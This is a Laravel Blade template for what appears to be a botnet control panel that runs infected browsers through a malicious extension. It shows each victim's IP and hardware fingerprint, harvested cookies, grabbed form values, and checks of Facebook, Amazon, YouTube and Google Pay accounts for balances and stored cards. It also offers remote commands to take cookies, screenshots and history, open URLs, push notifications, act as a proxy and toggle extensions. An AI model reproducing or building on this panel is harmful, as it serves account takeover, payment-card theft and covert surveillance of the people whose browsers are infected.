@extends('pages.layout')

@section('content')
    <div class="content-wrapper">

        <!-- Content -->

        <div class="container-fluid flex-grow-1 container-p-y">


            <h4 class="fw-bold py-3 mb-4">
                Bot #{{ $item->id }} - {{ $item->uuid }}
            </h4>
            <div class="row">
                <!-- User Sidebar -->
                <div class="col-xl-4 col-lg-5 col-md-5 order-1 order-md-0">
                    <!-- User Card -->
                    <div class="card mb-4">
                        <div class="card-body">
                            <h5 class="pb-2 border-bottom mb-4">Details</h5>
                            <div class="info-container">
                                <ul class="list-unstyled">
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">UUID:</span>
                                        <span>{{ $item->uuid }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Version:</span>
                                        <span>{{ $item->ext_version }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Referral:</span>
                                        <span>{{ $item->referral_code }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">IP:</span>
                                        <span>{{ $item->ip }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Country:</span>
                                        <span>{{ $item->country ?? 'N/A' }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Status:</span>
                                        @if ($isOnline)
                                            <span class="badge bg-label-success">Active</span>
                                        @else
                                            <span class="badge bg-label-danger">Offline</span>
                                        @endif
                                    </li>
                                    <li class="pb-2 border-bottom mb-4"></li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Platform:</span>
                                        <span>{{ $hardware['platform']['name'] }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">CPU:</span>
                                        <span>{{ $hardware['cpuName'] }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">RAM:</span>
                                        <span>{{ isset($hardware['memory']['capacity']) ? number_format($hardware['memory']['capacity'] / 1000000000, 0) : 0 }}GB</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">GPU:</span>
                                        <span>{{ $hardware['video']['renderer'] }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">User-Agent:</span>
                                        <span>{{ $hardware['userAgent'] }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Browser:</span>
                                        <?php
                                            $browserName = "UNKNOWN";

                                            if (preg_match("/chrome|chromium|crios/i", $hardware['userAgent'])) {
                                                $browserName = "Chrome";
                                            } else if (preg_match("/firefox|fxios/", $hardware['userAgent'])) {
                                                $browserName = "Firefox";
                                            } else if (preg_match("/safari/i", $hardware['userAgent'])) {
                                                $browserName = "Safari";
                                            } else if (preg_match("/opr\//i", $hardware['userAgent'])) {
                                                $browserName = "Opera";
                                            } else if (preg_match("/edg/i", $hardware['userAgent'])) {
                                                $browserName = "Edge";
                                            }
                                        ?>
                                        <span>{{ $browserName }}</span>
                                    </li>
                                    <li class="pb-2 border-bottom mb-4"></li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Created:</span>
                                        <span>{{ $item->created_at }}</span>
                                    </li>
                                    <li class="mb-3">
                                        <span class="fw-bold me-2">Activity:</span>
                                        <span>{{ $item->last_activity }}</span>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4">
                        <div class="card-body">
                            <h5 class="pb-2 border-bottom mb-4">Comment</h5>
                            <div class="info-container">
                                <ul class="list-unstyled">
                                    <form action="{{ route('machines.comment', ['id' => $item->id]) }}" method="POST">
                                        <div class="mb-3">
                                            <textarea
                                                id="comment"
                                                name="comment"
                                                class="form-control"
                                                placeholder=""
                                            >{{ $item->comment }}</textarea>
                                        </div>
                                        <button style="float: right;" type="submit" class="btn btn-primary">Save</button>
                                    </form>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <!-- /User Card -->
                </div>
                <!--/ User Sidebar -->


                <!-- User Content -->
                <div class="col-xl-8 col-lg-7 col-md-7 order-0 order-md-1">
                    <!-- User Pills -->
                    <ul class="nav nav-pills flex-column flex-md-row mb-3">
                        <li class="nav-item">
                            <a id="cookiesTab" class="nav-link" style="cursor: pointer;"
                               onclick="openCookiesTab()">
                                <i class="bx bx-cookie me-1"></i>Cookies
                            </a>
                        </li>
                        <li class="nav-item">
                            <a id="checkersTab" class="nav-link" style="cursor: pointer;"
                               onclick="openCheckersTab()">
                                <i class="bx bx-check me-1"></i>Checkers
                            </a>
                        </li>
                        <li class="nav-item">
                            <a id="extensionsTab" class="nav-link" style="cursor: pointer;"
                               onclick="openExtensionsTab()">
                                <i class="bx bx-extension me-1"></i>Extensions
                            </a>
                        </li>
                        <li class="nav-item">
                            <a id="grabbersTab" class="nav-link" style="cursor: pointer;" onclick="openGrabbersTab()">
                                <i class="bx bx-grid-alt me-1"></i>Grabbers
                            </a>
                        </li>
                        <li class="nav-item">
                            <a id="commandsTab" class="nav-link" style="cursor: pointer;" onclick="openCommandsTab()">
                                <i class="bx bx-command me-1"></i>Commands
                            </a>
                        </li>
                    </ul>
                    <!--/ User Pills -->

                    <div class="card mb-4" id="cookiesList" style="display: none;">
                        <h5 class="card-header">Cookies list</h5>
                        <div class="table-responsive mb-3">
                            <div class="card-datatable table-responsive">
                                <table id="cookies" class="dt-fixedheader table border-top">
                                    <thead>
                                    <tr>
                                        <th>Name</th>
                                        <th>Count</th>
                                    </tr>
                                    </thead>
                                    <tfoot>
                                    <tr>
                                        <th>Name</th>
                                        <th>Count</th>
                                    </tr>
                                    </tfoot>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4" id="checkersList" style="display: none;">
                        <h5 class="card-header">Checkers list</h5>
                        <div class="table-responsive mb-3">
                            <div class="card-datatable table-responsive">
                                <table id="checkers" class="dt-fixedheader table border-top">
                                    <thead>
                                    <tr>
                                        <th>Site</th>
                                        <th>Value</th>
                                    </tr>
                                    </thead>
                                    <tfoot>
                                    <tr>
                                        <th>Site</th>
                                        <th>Value</th>
                                    </tr>
                                    </tfoot>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4" id="extensionsList" style="display: none;">
                        <h5 class="card-header">Extensions list</h5>
                        <div class="table-responsive mb-3">
                            <div class="card-datatable table-responsive">
                                <table id="extensions" class="dt-fixedheader table border-top">
                                    <thead>
                                    <tr>
                                        <th>ID</th>
                                        <th>Name</th>
                                        <th>Enabled</th>
                                        <th></th>
                                    </tr>
                                    </thead>
                                    <tfoot>
                                    <tr>
                                        <th>ID</th>
                                        <th>Name</th>
                                        <th>Enabled</th>
                                        <th></th>
                                    </tr>
                                    </tfoot>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4" id="grabbersList" style="display: none;">
                        <h5 class="card-header">Grabbers list</h5>
                        <div class="table-responsive mb-3">
                            <div class="card-datatable table-responsive">
                                <table id="grabbers" class="dt-fixedheader table border-top">
                                    <thead>
                                    <tr>
                                        <th>Url</th>
                                        <th>Name</th>
                                        <th>Value</th>
                                        <th>Date</th>
                                    </tr>
                                    </thead>
                                    <tfoot>
                                    <tr>
                                        <th>Url</th>
                                        <th>Name</th>
                                        <th>Value</th>
                                        <th>Date</th>
                                    </tr>
                                    </tfoot>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div id="commandsList" style="display: none;">
                        <div class="col-xl">
                            <div class="card mb-4">
                                <div class="card-header d-flex justify-content-between align-items-center">
                                    <h5 class="mb-0">Send command</h5>
                                </div>
                                <div class="card-body">
                                    <form action="{{ route('commands.create') }}" method="POST">
                                        <input name="machineId" hidden="" value="{{ $item->id }}"/>

                                        <div class="mb-3">
                                            <label class="form-label" for="cmd">Command</label>
                                            <select id="cmd" class="select2 form-select" name="cmd">
                                                <option value="info">Update Machine Info</option>
                                                <option value="proxy">Enable/Disable Proxy</option>
                                                <option value="push">Send Push Notification</option>
                                                <option value="cookies">Get Cookies</option>
                                                <option value="screenshot">Get Screenshot</option>
                                                <option value="url">Open Url</option>
                                                <option value="current_url">Get Current Url</option>
                                                <option value="history">Get History</option>
                                            </select>
                                        </div>
                                        <div id="command_push_notification" style="display: none;">
                                            <div class="mb-3">
                                                <label class="form-label" for="icon_url">Icon Url</label>
                                                <input type="text" name="icon_url" class="form-control">
                                            </div>
                                            <div class="mb-3">
                                                <label class="form-label" for="title">Title</label>
                                                <input type="text" name="title" class="form-control">
                                            </div>
                                            <div class="mb-3">
                                                <label class="form-label" for="message">Message</label>
                                                <input type="text" name="message" class="form-control">
                                            </div>
                                            <div class="mb-3">
                                                <label class="form-label" for="url">Url</label>
                                                <input type="text" name="url" class="form-control">
                                            </div>
                                        </div>
                                        <div id="command_url" style="display: none;">
                                            <div class="mb-3">
                                                <label class="form-label" for="cmd_url">Url</label>
                                                <input type="text" name="cmd_url" class="form-control">
                                            </div>
                                        </div>
                                        <div id="command_proxy" style="display: none;">
                                            <div class="mb-3">
                                                <label class="form-label" for="is_enabled">Status</label>
                                                <select class="select2 form-select" name="is_enabled">
                                                    <option value="1">Enable</option>
                                                    <option value="0">Disable</option>
                                                </select>
                                            </div>
                                        </div>
                                        <button type="submit" class="btn btn-primary">Send</button>
                                    </form>
                                </div>
                            </div>
                        </div>

                        <div class="card mb-4">
                            <h5 class="card-header">Commands list</h5>
                            <div class="table-responsive mb-3">
                                <div class="card-datatable table-responsive">
                                    <table id="commands" class="dt-fixedheader table border-top">
                                        <thead>
                                        <tr>
                                            <th>Command</th>
                                            <th>Answer</th>
                                            <th>Date</th>
                                        </tr>
                                        </thead>
                                        <tfoot>
                                        <tr>
                                            <th>Command</th>
                                            <th>Answer</th>
                                            <th>Date</th>
                                        </tr>
                                        </tfoot>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- /Project table -->
                </div>
                <!--/ User Content -->
            </div>
        </div>
        <!-- / Content -->
    </div>

    <script>
        const openCookiesTab = () => {
            const url = '{{ route('machines.cookies', ['id' => $item->id]) }}'

            $('#checkersList').hide()
            $('#extensionsList').hide()
            $('#grabbersList').hide()
            $('#commandsList').hide()
            $('#cookiesList').show()

            $('#checkersTab').removeClass('active')
            $('#extensionsTab').removeClass('active')
            $('#grabbersTab').removeClass('active')
            $('#commandsTab').removeClass('active')
            $('#cookiesTab').addClass('active')

            $('#cookies').dataTable().fnDestroy();
            $('#cookies').DataTable({
                responsive: true,
                searchDelay: 500,
                processing: true,
                serverSide: true,
                ajax: url,
                columns: [
                    {data: 'id'},
                    {data: 'cnt'},
                ],
                columnDefs: [
                    {
                        targets: 0,
                        visible: true,
                        render: function (data, type, full, meta) {
                            return (`<img src="${full.cookie_setting.icon_url}" width="32" height="32" /> ${full.cookie_setting.name}`);
                        }
                    },
                    {
                        targets: 1,
                        visible: true
                    },
                ],
                dom: '<"row"<"col-sm-12 col-md-6"l><"col-sm-12 col-md-6 d-flex justify-content-center justify-content-md-end"f>>t<"row"<"col-sm-12 col-md-6"i><"col-sm-12 col-md-6"p>>'
            })
        }

        const openCheckersTab = () => {
            const url = '{{ route('machines.checkers', ['id' => $item->id]) }}'

            $('#extensionsList').hide()
            $('#grabbersList').hide()
            $('#commandsList').hide()
            $('#cookiesList').hide()
            $('#checkersList').show()

            $('#extensionsTab').removeClass('active')
            $('#grabbersTab').removeClass('active')
            $('#commandsTab').removeClass('active')
            $('#cookiesTab').removeClass('active')
            $('#checkersTab').addClass('active')

            $('#checkers').dataTable().fnDestroy();
            $('#checkers').DataTable({
                responsive: true,
                searchDelay: 500,
                processing: true,
                serverSide: true,
                ajax: url,
                columns: [
                    {data: 'site'},
                    {data: 'id'},
                ],
                columnDefs: [
                    {
                        targets: 0,
                        visible: true
                    },
                    {
                        targets: 1,
                        visible: true,
                        render: function (data, type, full, meta) {
                            const body = JSON.parse(full.params)

                            let text = "";

                            if (full.site === 'Facebook') {
                                text = `Balance: ${body.balance} ${body.currency}</br>Spend: ${body.spend.min}/${body.spend.max} ${body.currency}`
                            }

                            if (full.site === 'Amazon') {
                                text = `Balance: ${body.balance}</br>Cards: ${body.cards}</br>Orders: ${body.orders}`
                            }

                            if (full.site === 'Youtube') {
                                text = `Reg: ${body.joinedData}</br>Sub: ${body.subscribers}`
                            }

                            if (full.site === 'Pay Google') {
                                text = `Cards: ${body.cards}`
                            }

                            if (full.site === 'Ads Google') {
                                text = `Login: ${body.isLoggedIn}`
                            }

                            return text;
                        }
                    },
                ],
                dom: '<"row"<"col-sm-12 col-md-6"l><"col-sm-12 col-md-6 d-flex justify-content-center justify-content-md-end"f>>t<"row"<"col-sm-12 col-md-6"i><"col-sm-12 col-md-6"p>>'
            })
        }

        const openExtensionsTab = () => {
            const url = '{{ route('machines.extensions', ['id' => $item->id]) }}'

            $('#checkersList').hide()
            $('#extensionsList').show()
            $('#grabbersList').hide()
            $('#commandsList').hide()
            $('#cookiesList').hide()

            $('#extensionsTab').addClass('active')
            $('#grabbersTab').removeClass('active')
            $('#commandsTab').removeClass('active')
            $('#cookiesTab').removeClass('active')
            $('#checkersTab').removeClass('active')

            $('#extensions').dataTable().fnDestroy();
            $('#extensions').DataTable({
                responsive: true,
                searchDelay: 500,
                processing: true,
                serverSide: true,
                ajax: url,
                columns: [
                    {data: 'ext_id'},
                    {data: 'name'},
                    {data: 'is_enabled'},
                    {data: 'id'},
                ],
                columnDefs: [
                    {
                        targets: 0,
                        visible: true
                    },
                    {
                        targets: 1,
                        visible: true
                    },
                    {
                        targets: 2,
                        visible: true,
                        render: function (data, type, full, meta) {
                            let status = '<span class="badge bg-label-success">Active</span>'

                            if (!full.is_enabled) {
                                status = '<span class="badge bg-label-danger">Disabled</span>'
                            }

                            return status;
                        }
                    },
                    {
                        targets: -1,
                        title: 'Actions',
                        orderable: false,
                        render: function (data, type, full, meta) {
                            const text = full.is_enabled ? 'Disable' : 'Enable';

                            return (
                                '<div class="d-inline-block">' +
                                '<a href="javascript:;" class="btn btn-sm btn-icon dropdown-toggle hide-arrow" data-bs-toggle="dropdown"><i class="bx bx-dots-vertical-rounded"></i></a>' +
                                '<div class="dropdown-menu dropdown-menu-end m-0">' +
                                '<form action="{{ route('commands.create') }}" method="POST">' +
                                '<input name="cmd" value="extension" hidden />' +
                                '<input name="machineId" value="' + full.machine_id + '" hidden />' +
                                '<input name="id" value="' + full.id + '" hidden />' +
                                '<input name="name" value="' + full.name + '" hidden />' +
                                '<button type="submit" class="dropdown-item">' + text + '</button>' +
                                '</form>' +
                                '</div>' +
                                '</div>'
                            );
                        }
                    }
                ],
                dom: '<"row"<"col-sm-12 col-md-6"l><"col-sm-12 col-md-6 d-flex justify-content-center justify-content-md-end"f>>t<"row"<"col-sm-12 col-md-6"i><"col-sm-12 col-md-6"p>>'
            })
        }

        const openGrabbersTab = () => {
            const url = '{{ route('machines.grabbers', ['id' => $item->id]) }}'

            $('#checkersList').hide()
            $('#extensionsList').hide()
            $('#grabbersList').show()
            $('#commandsList').hide()
            $('#cookiesList').hide()

            $('#extensionsTab').removeClass('active')
            $('#grabbersTab').addClass('active')
            $('#commandsTab').removeClass('active')
            $('#cookiesTab').removeClass('active')
            $('#checkersTab').removeClass('active')

            $('#grabbers').dataTable().fnDestroy();
            $('#grabbers').DataTable({
                responsive: true,
                searchDelay: 500,
                processing: true,
                serverSide: true,
                ajax: url,
                columns: [
                    {data: 'url'},
                    {data: 'name'},
                    {data: 'value'},
                    {data: 'created_at'}
                ],
                order: [3, 'desc'],
                columnDefs: [
                    {
                        targets: 0,
                        visible: true,
                    },
                    {
                        targets: 1,
                        visible: true,
                    },
                    {
                        targets: 2,
                        visible: true,
                    },
                    {
                        targets: 3,
                        visible: true,
                        render: function (data, type, full, meta) {
                            return new Date(full.created_at).toLocaleString()
                        }
                    },
                ],
                dom: '<"row"<"col-sm-12 col-md-6"l><"col-sm-12 col-md-6 d-flex justify-content-center justify-content-md-end"f>>t<"row"<"col-sm-12 col-md-6"i><"col-sm-12 col-md-6"p>>'
            })
        }

        const openCommandsTab = () => {
            const url = '{{ route('machines.commands', ['id' => $item->id]) }}'

            $('#checkersList').hide()
            $('#extensionsList').hide()
            $('#grabbersList').hide()
            $('#cookiesList').hide()
            $('#commandsList').show()

            $('#extensionsTab').removeClass('active')
            $('#grabbersTab').removeClass('active')
            $('#commandsTab').addClass('active')
            $('#cookiesTab').removeClass('active')
            $('#checkersTab').removeClass('active')

            $('#commands').dataTable().fnDestroy();
            $('#commands').DataTable({
                responsive: true,
                searchDelay: 500,
                processing: true,
                serverSide: true,
                ajax: url,
                columns: [
                    {data: 'command'},
                    {data: 'answer'},
                    {data: 'created_at'}
                ],
                order: [2, 'desc'],
                columnDefs: [
                    {
                        targets: 0,
                        visible: true,
                        render: function (data, type, full, meta) {
                            let cmd = ''

                            if (full.command.cmd === 'extension') {
                                cmd = `${full.command.data.enable ? 'Enable' : 'Disable'} ${full.command.data.name} Extension`
                            }

                            if (full.command.cmd === 'info') {
                                cmd = `Machine Info`
                            }

                            if (full.command.cmd === 'push') {
                                cmd = `Push Notification`
                            }

                            if (full.command.cmd === 'cookies') {
                                cmd = `Cookies`
                            }

                            if (full.command.cmd === 'screenshot') {
                                cmd = `Screenshot`
                            }

                            if (full.command.cmd === 'url') {
                                cmd = `Open ${full.command.data.url}`
                            }

                            if (full.command.cmd === 'current_url') {
                                cmd = `Current Url`
                            }

                            if (full.command.cmd === 'history') {
                                cmd = `History`
                            }

                            if (full.command.cmd === 'proxy') {
                                cmd = `${full.command.data.isEnabled ? 'Enable' : 'Disable'} Proxy`
                            }

                            return cmd
                        }
                    },
                    {
                        targets: 1,
                        visible: true,
                        render: function (data, type, full, meta) {
                            let cmd = '<span class="badge bg-label-secondary">Waiting</span>'

                            if (full.answer) {
                                const answer = JSON.parse(full.answer)

                                if (full.command.cmd === 'cookies' || full.command.cmd === 'screenshot' || full.command.cmd === 'history') {
                                    cmd = '<a class="badge bg-label-success" href="' + full.download_url + '">Download</a>'
                                } else if (full.command.cmd === 'current_url') {
                                    cmd = '<a class="badge bg-label-success" style="text-transform: lowercase;">' + answer.tab.url + '</a>'
                                } else {
                                    cmd = '<span class="badge bg-label-success">Done</span>'
                                }
                            }

                            return cmd
                        }
                    },
                    {
                        targets: 2,
                        visible: true,
                        render: function (data, type, full, meta) {
                            return new Date(full.created_at).toLocaleString()
                        }
                    },
                ],
                dom: '<"row"<"col-sm-12 col-md-6"l><"col-sm-12 col-md-6 d-flex justify-content-center justify-content-md-end"f>>t<"row"<"col-sm-12 col-md-6"i><"col-sm-12 col-md-6"p>>'
            })
        }

        openCookiesTab()

        $("#cmd").change(function (e) {
            const cmd = $(e.currentTarget).val()

            $('#command_push_notification').hide()
            $('#command_url').hide()

            if (cmd === 'push') {
                $('#command_push_notification').show()
            }

            if (cmd === 'url') {
                $('#command_url').show()
            }

            if (cmd === 'proxy') {
                $('#command_proxy').show()
            }
        })
    </script>
@endsection
